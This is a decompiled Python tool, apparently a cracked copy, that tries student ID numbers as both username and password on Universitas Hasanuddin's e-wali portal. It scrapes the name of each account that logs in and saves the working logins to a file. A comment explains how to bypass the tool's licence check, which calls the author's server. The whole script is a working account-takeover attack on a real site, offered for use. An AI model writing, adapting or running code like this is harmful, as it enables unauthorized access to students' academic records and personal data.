# decompyle3 version 3.3.2
# Python bytecode 3.8
# Decompiled from: Python 3.8.5 (default, Jul 24 2020, 12:30:11) 
# [Clang 9.0.8 (https://android.googlesource.com/toolchain/llvm-project 98c855489
# Embedded file name: <EzzKun>
import os, time, platform, requests as req, requests.packages.urllib3
from bs4 import BeautifulSoup as bs
requests.packages.urllib3.disable_warnings()
grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[47;30m'
off = '\x1b[m'
flag = '\x1b[47;30m'
pf = platform.uname()
me = pf.release
sukses = []

def cek(nim):
    ses = req.Session()
    url = 'https://ewali.unhas.ac.id/'
    raw = ses.get(url).text
    tok = bs(raw, 'html.parser').findAll('input')[0]['value']
    dat = {'_token':tok,
     'username':nim,
     'password':nim,
     'login':'submit'}
    ses.post(url, data=dat).text
    row = ses.get('https://ewali.unhas.ac.id/nilaimk').text
    try:
        nama = bs(row, 'html.parser').find('tbody').findAll('td')[1].get_text()
        print(f" {cyan}> {green}{nim} {cyan}- {green}{nama}")
        sukses.append(nim)
        with open('hasil.txt', 'a') as save:
            save.write(f"> {nim} - {nama}\n")
    except:
        print(f" {cyan}> {red}{nim} {cyan}- {red}Login error")


def run():
    try:
        path = input(f" {cyan}>{white} Filepath: {cyan}")
        with open(path, 'r') as file:
            lines = file.readlines()
            print(f" {cyan}>{white} Total {green}{len(lines)} {white}NIM terdeteksi ")
            for line in lines:
                nim = line.strip()
                cek(nim)
            else:
                if len(sukses) > 0:
                    print(f" {cyan}>{green} {len(sukses)}{white} data login tersimpan ")
                else:
                    pass

    except FileNotFoundError:
        print(f" {cyan}>{red} File tidak ditemukan :( ")
    except KeyboardInterrupt:
        exit()


def main():
    os.system('clear')
    print(f"{flag} Checker NIM UNHAS | By: YutixCode {off}\n")
    try:
        lisensi = req.get(f"https://yutixcode.xyz/tool/UNHAS/{me}", verify=False).status_code
    except KeyboardInterrupt:
        exit()
    except:
        exit()

    if lisensi == 200: # replace aja == jadi != done
        run()
    else:
        print(f" {cyan}> {red}Akses ditolak")
        print(f" {cyan}> {red}kamu tidak memiliki izin")
        print(f" {cyan}> {red}kode akses kamu: {green}{me}")
        x = 11
        try:
            for i in range(10):
                x -= 1
                print(end=f"\r {cyan}> {green}{x} {white}detik menuju Whatsapp Admin ")
                time.sleep(1)
            else:
                print(end='\r')

        except KeyboardInterrupt:
            exit('\n')
        else:
            os.system(f"xdg-open https://wa.me/6285759655315?text=Code%3A%20{me}")
            exit()


if __name__ == '__main__':
    main()